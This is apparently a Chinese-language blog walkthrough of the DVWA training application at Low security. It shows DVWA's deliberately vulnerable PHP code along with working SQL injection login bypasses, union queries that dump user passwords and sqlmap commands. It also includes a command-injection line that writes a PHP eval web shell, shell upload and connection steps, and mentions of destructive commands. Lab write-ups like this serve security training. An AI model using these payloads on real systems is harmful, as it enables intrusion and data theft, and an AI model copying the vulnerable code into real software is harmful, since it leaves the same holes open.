---
layout: default
title: "DVWA-level-low"
tags: dvwa
---

# Damn Vulnerable Web Application (DVWA)-Low

> 从头开始，重新做一遍 DVWA ，尽可能的做一篇更详尽的通过方法。
>
> 复现步骤中有不少都是借鉴的Freebuf上面前辈写过的

首先，从浏览器中打开 DVWA 地址并使用默认账号（admin）密码（password）登录。

![brute (1)](/images/dvwa2/brute (1).jpg)

![brute (2)](/images/dvwa2/brute (2).jpg)

进入到“DVWA Security”中，将安全级别设置为“Low”，点击“Submit”按钮提交确认。

![brute (3)](/images/dvwa2/brute (3).jpg)

#### Brute Force（暴力破解）：

>   在 DVWA 中暴力破解的对象用户名即账号为 DVWA 的管理账号及密码“admin”，“password”

暴力破解的产生是由于服务器端没有做限制，攻击者可通过暴力枚举的手段破解所需信息，暴力破解的关键在于字典的大小。

```php
<?php

if( isset( $_GET[ 'Login' ] ) ) {
	// Get username
	$user = $_GET[ 'username' ];

	// Get password
	$pass = $_GET[ 'password' ];
	$pass = md5( $pass );

	// Check the database
	$query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
	$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

	if( $result && mysqli_num_rows( $result ) == 1 ) {
		// Get users details
		$row    = mysqli_fetch_assoc( $result );
		$avatar = $row["avatar"];

		// Login successful
		$html .= "<p>Welcome to the password protected area {$user}</p>";
		$html .= "<img src=\"{$avatar}\" />";
	}
	else {
		// Login failed
		$html .= "<pre><br />Username and/or password incorrect.</pre>";
	}

	((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```

从源码中可以看出后端只是验证了参数”Login“的状态是否设置，无防暴机制，采用 GET 方式传递参数且对在 SQL 语句中并未做任何过滤，存在 SQL 注入漏洞。

1.  进入到测试页面，页面内容为用户登录框。

    ![brute (4)](/images/dvwa2/brute (4).jpg)

    输入用户名“admin”密码“admin”后点击“Login”按钮，提示“用户名或密码错误”

    ![brute (5)](/images/dvwa2/brute (5).jpg)

    接着我们开启burp代理并再次对登录操作进行抓包

    ![brute (6)](/images/dvwa2/brute (6).jpg)

    将请求信息放入“Intruder”中，点击“Clear”按钮清楚位置标记后，选中参数“password”后的内容“admin”，点击“Add”按钮添加位置标记

    ![brute (7)](/images/dvwa2/brute (7).jpg)

    随后设置“Payload”，这里选择一个含有“password”的字典即可，随后点击“Start Attack”按钮开始进行暴破

    ![brute (8)](/images/dvwa2/brute (8).jpg)

    暴破结束后，根据响应包的“Length”进行排序对比

    ![brute (9)](/images/dvwa2/brute (9).jpg)

    可以看到”password“的响应包长度不同，推测password为正确密码。

    ![brute (10)](/images/dvwa2/brute (10).jpg)

    这里可以直接在响应包详情这里看到响应后的页面。

    ![brute (11)](/images/dvwa2/brute (11).jpg)

2.  除了上述采用 Burp Suite 或其他工具对密码进行暴力枚举的方式外，这里还可以使用由 SQL 注入引起的”万能密码“

    回到浏览器中，在登录框的用户名处输入“admin'#”，密码留空，点击登录按钮

    ![brute (12)](/images/dvwa2/brute (12).jpg)

    登录成功

    ![brute (13)](/images/dvwa2/brute (13).jpg)

    在登录框用户名处输入“admin' or' 1'='1#”，密码留空，点击登录按钮

    ![brute (14)](/images/dvwa2/brute (14).jpg)

    登陆成功

    ![brute (15)](/images/dvwa2/brute (15).jpg)

3.  现在假设我们并不知道目标的用户名及密码，对登录框进行 SQL 注入测试

    在用户名处输入“ '# '”，执行登录操作后提示“用户名或密码错误”

    ![brute (16)](/images/dvwa2/brute (16).jpg)

    在用户名处输入“ or '1'='1# ”，执行登录操作

    ![brute (17)](/images/dvwa2/brute (17).jpg)

    可以看到页面出现了 SQL 语法报错，并且在后面还报出了一段空密码的哈希值

    ![brute (18)](/images/dvwa2/brute (18).jpg)

    由于 Low 级别的暴力破解测试并未对 SQL 语句做任何过滤等措施，这里将前面 burp 拦截到的请求数据包信息复制到一个文本文件中用作 sqlmap 的请求报文（由于这里登录操作采用的是 GET 方式进行传参，也可直接利用登录执行后的目标 URL 作为 sqlmap的测试目标）

    ![brute (19)](/images/dvwa2/brute (19).jpg)

    终端中输入：`sqlmap -r test.txt -p username`

    ![brute (20)](/images/dvwa2/brute (20).jpg)

    很快就识别存在注入

    接下来可以依次进行库、表、字段的注入操作

    ![brute (21)](/images/dvwa2/brute (21).jpg)

    ![brute (22)](/images/dvwa2/brute (22).jpg)

在获取到目标数据库信息后，还可以判断当前站点数据库账号是否为数据库管理员账号，若是数据库管理员身份账号且对站点目录具有一定的写权限的话，可利用 sql 注入写入 shell 或直接执行系统命令以达到更深层次的渗透。

#### Command Injection（命令注入又叫命令执行）

当在应用程序的代码中中存在可以执行系统命令的函数且能被黑客利用时，就可以将恶意的系统命令拼接到正常命令中，从而造成命令执行攻击。

```php
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = $_REQUEST[ 'ip' ];

    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }

    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}

?>
```

该页面提供了ping的功能，当用户输入目标地址后，客户端将会执行ping命令并返回相应的结果。但上述代码中并未对IP参数做任何过滤，导致存在漏洞。

1.  首先在输入框内输入一个本地地址“127.0.0.1” 看下回显，可以根据这里的回显简单的判断下目标服务器使用的是个什么操作系统。

    ![ci1](/images/dvwa2/ci1.jpg)

2.  随后再输入“127.0.0.1 & whoami” 查看下当前系统登录用户是什么（在Windows和Linux系统都可以使用“&” “&&” 或者管道符来执行多条命令）

    ![ci2](/images/dvwa2/ci2.jpg)

3.  利用“dir”命令查看下当前目录及内容

    ![ci3](/images/dvwa2/ci3.jpg)

4.  由于Windows系统中自带的cmd不如Linux中的bash等灵活方便，这里直接利用命令注入写入一个一句话木马方便渗透

    输入“**127.0.0.1 & echo "<?php @eval($_POST['cmd']); ?>" > cmd.php**”，然后点击提交按钮执行，执行后再次使用“dir”命令查看是否写入成功

    ![ci4](/images/dvwa2/ci4.jpg)

5.  然后就可以利用蚁剑或菜刀进行连接

    ![ci5](/images/dvwa2/ci5.jpg)

    ![ci6](/images/dvwa2/ci6.jpg)

    ![ci7](/images/dvwa2/ci7.jpg)

6.  除了通过写入或反弹shell对目标进行持久渗透之外，像是Windows命令行中的“del”，Linux中的“rm” “mv”命令对系统文件进行删除操作对目标造成破坏性攻击，或者结合系统中的脚本、注册表、自动化任务等实时获取到目标系统的信息或者实现无限重启等操作。



#### Cross Site Request Forgery（CSRF 跨站请求伪造）

CSRF是指通过伪装成受信任用户请求受信任的网站，与XSS的不同之处在于CSRF是直接利用受害者尚未失效的身份认证信息，以受害者的身份实现某些操作。

```php
<?php

if( isset( $_GET[ 'Change' ] ) ) {
    // Get input
    $pass_new  = $_GET[ 'password_new' ];
    $pass_conf = $_GET[ 'password_conf' ];

    // Do the passwords match?
    if( $pass_new == $pass_conf ) {
        // They do!
        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
        $pass_new = md5( $pass_new );

        // Update the database
        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

        // Feedback for the user
        echo "<pre>Password Changed.</pre>";
    }
    else {
        // Issue with passwords matching
        echo "<pre>Passwords did not match.</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```

上面的代码中并未做任何防CSRF机制，服务器在收到请求后，只是检查“password_new”与“password_conf”是否相等。

CSRF在DVWA中的利用方式相对来说较为简单，只需要修改密码，然后利用修改密码的GET请求url进行交互操作即可。

![cs1](/images/dvwa2/cs1.jpg)

![cs2](/images/dvwa2/cs2.jpg)

但在平时的项目中，若想实现有效的CSRF攻击，往往需要进行合理的伪装并且为达到危害最大化还可以与XSS等多种漏洞进行联动结合，基本上CSRF的攻击实现往往都需要受害者介入交互，因此是否能够成功的引诱受害者介入将成为CSRF的关键所在。除此之外，由于不同浏览器所产生产生的身份认证信息会有所不同，攻击者在考虑CSRF的时候还会将浏览器的选择加入在内。



#### File Inclusion（文件包含）

>   通过函数包含文件时，由于没有对包含的文件名进行有效的过滤处理，被攻击者利用从而导致了包含了Web根目录以外的文件进来，就会导致文件信息的泄露甚至注入了恶意代码	--segmentfault

```php
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

?>
```

上述代码明显未对“page”参数做任何的过滤检查。

点击任意链接即可执行对应的php文件

![fi](/images/dvwa2/fi.jpg)

![fi3](/images/dvwa2/fi3.jpg)

![fi4](/images/dvwa2/fi4.jpg)

在DVWA中的文件包含如果目标文件为php文件，则会当作php文件来执行，若目标文件非php文件，则会打印输出文件的文本内容。

![fi2](/images/dvwa2/fi2.jpg)

当目标站点存在文件包含漏洞且开启了“allow_url_fopen”函数，除读取目标站点本地文件外，还可以在远程服务器上传构造好的php文件，读取远程服务器的文件实现任意代码执行漏洞。



#### File Upload（文件上传）

上传文件时，如果服务器端未对客户端上传的文件进行严格检查与过滤，并且上传文件所在目录支持读取访问脚本文件格式（asp、aspx、php、jsp等）就容易造成上传任意文件漏洞。通常攻击者大多采用上传WebShell来达到获取目标服务器权限的操作。

```php
<?php

if( isset( $_POST[ 'Upload' ] ) ) {
    // Where are we going to be writing to?
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

    // Can we move the file to the upload folder?
    if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
        // No
        echo '<pre>Your image was not uploaded.</pre>';
    }
    else {
        // Yes!
        echo "<pre>{$target_path} succesfully uploaded!</pre>";
    }
}

?>
```

上述代码中，服务器端对上传文件没有做任何限制，文件上传成功后，会返回一个上传文件的路径信息。

1.  上传一个一句话木马

    ![fu](/images/dvwa2/fu.jpg)

    ![fu1](/images/dvwa2/fu1.jpg)

    上传成功后返回一个上传文件所在路径

    ![fu2](/images/dvwa2/fu2.jpg)

2.  然后蚁剑连接

    ![fu3](/images/dvwa2/fu3.jpg)

    ![fu4](/images/dvwa2/fu4.jpg)

    ![fu5](/images/dvwa2/fu5.jpg)



#### Insecure CAPTCHA（不安全的验证码）

DVWA中的不安全的验证码确切说是一个逻辑漏洞，由于开发人员设计程序时的的程序逻辑存在缺陷导致。

```php
<?php

if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '1' ) ) {
    // Hide the CAPTCHA form
    $hide_form = true;

    // Get input
    $pass_new  = $_POST[ 'password_new' ];
    $pass_conf = $_POST[ 'password_conf' ];

    // Check CAPTCHA from 3rd party
    $resp = recaptcha_check_answer(
        $_DVWA[ 'recaptcha_private_key'],
        $_POST['g-recaptcha-response']
    );

    // Did the CAPTCHA fail?
    if( !$resp ) {
        // What happens when the CAPTCHA was entered incorrectly
        $html     .= "<pre><br />The CAPTCHA was incorrect. Please try again.</pre>";
        $hide_form = false;
        return;
    }
    else {
        // CAPTCHA was correct. Do both new passwords match?
        if( $pass_new == $pass_conf ) {
            // Show next stage for the user
            echo "
                <pre><br />You passed the CAPTCHA! Click the button to confirm your changes.<br /></pre>
                <form action=\"#\" method=\"POST\">
                    <input type=\"hidden\" name=\"step\" value=\"2\" />
                    <input type=\"hidden\" name=\"password_new\" value=\"{$pass_new}\" />
                    <input type=\"hidden\" name=\"password_conf\" value=\"{$pass_conf}\" />
                    <input type=\"submit\" name=\"Change\" value=\"Change\" />
                </form>";
        }
        else {
            // Both new passwords do not match.
            $html     .= "<pre>Both passwords must match.</pre>";
            $hide_form = false;
        }
    }
}

if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '2' ) ) {
    // Hide the CAPTCHA form
    $hide_form = true;

    // Get input
    $pass_new  = $_POST[ 'password_new' ];
    $pass_conf = $_POST[ 'password_conf' ];

    // Check to see if both password match
    if( $pass_new == $pass_conf ) {
        // They do!
        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
        $pass_new = md5( $pass_new );

        // Update database
        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

        // Feedback for the end user
        echo "<pre>Password Changed.</pre>";
    }
    else {
        // Issue with the passwords matching
        echo "<pre>Passwords did not match.</pre>";
        $hide_form = false;
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```

当验证通过后，服务器通知客户端，随后客户端再将表单中的数据提交，但是代码中并未对验证码的有效性做验证。

1.  输入要修改的密码，开启burp代理拦截，然后点击“Change”按钮提交（因为种种原因，这里的验证码显示不出来）

    ![ic1](/images/dvwa2/ic1.jpg)

    ![ic2](/images/dvwa2/ic2.jpg)

2.  修改“step”参数的值为2，然后放行

    ![ic3](/images/dvwa2/ic3.jpg)

3.  回到浏览器中，提示密码修改成功

    ![ic4](/images/dvwa2/ic4.jpg)



#### SQL Injection（SQL注入）

SQL注入指的是Web应用对用户输入数据的合法性没有进行判断，前端传入后端的参数是攻击者可控的，并且参数带入数据库查询，攻击者可以通过构造不同的SQL语句来实现对数据库的操作。

```php
<?php

if( isset( $_REQUEST[ 'Submit' ] ) ) {
    // Get input
    $id = $_REQUEST[ 'id' ];

    // Check database
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    // Get results
    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Get values
        $first = $row["first_name"];
        $last  = $row["last_name"];

        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }

    mysqli_close($GLOBALS["___mysqli_ston"]);
}

?> 
```

上述代码对用户输入的参数“id”没有做任何的过滤检查，存在明显的SQL注入

1.  输入id“1”，查询成功

    ![si1](/images/dvwa2/si1.jpg)

2.  输入“1'”，返回语法报错

    ![si2](/images/dvwa2/si2.jpg)

3.  分别输入“1'and '1'='1”与“1'and '1'='2”，判断结果

    ![si3](/images/dvwa2/si3.jpg)

    ![si4](/images/dvwa2/si4.jpg)

    说明存在字符型注入。

4.  通过“order by”或“union select 1,2,3...”查询结果，判断当前数据表中的字段数

    ![si5](/images/dvwa2/si5.jpg)

    ![si6](/images/dvwa2/si6.jpg)

    ![si7](/images/dvwa2/si7.jpg)

    ![si18](/images/dvwa2/si18.jpg)

    ![si19](/images/dvwa2/si19.jpg)

    得出当前数据表的字段数为2。

5.  若前面判断数据表字段数时使用了“union select”的方法，还可以确定出显示的字段顺序

    ![si8](/images/dvwa2/si8.jpg)

    说明这里执行的SQL语句为：

    ```sql
    select `First name`,`Surname` from 表名 where ID=id;
    ```

6.  输入” 1'union select 1,database()# “获取当前数据库名

    ![si9](/images/dvwa2/si9.jpg)

    输入” 1'union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()# “获取当前数据库的表

    ![si10](/images/dvwa2/si10.jpg)

    输入” 1'union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'# “获取users表中的字段名

    ![si11](/images/dvwa2/si11.jpg)

    输入” 1'union select 1,group_concat(user_id,user,password) from users “获取users表中字段user_id、user、password的内容

    ![si12](/images/dvwa2/si12.jpg)

7.  使用SQLmap进行注入，这里再进行注入之前需先开启Burp的代理拦截后，抓取提交”id“的请求数据，因为当中含有DVWA的登录身份验证信息，直接采用url进行注入的话会提示跳转DVWA的登录页面。将抓取到的请求数据保存为文本格式文件

    ![si13](/images/dvwa2/si13.jpg)

    然后在进行由浅至深的注入

    ![si14](/images/dvwa2/si14.jpg)

    ![si15](/images/dvwa2/si15.jpg)

    ![si16](/images/dvwa2/si16.jpg)

    ![si17](/images/dvwa2/si17.jpg)



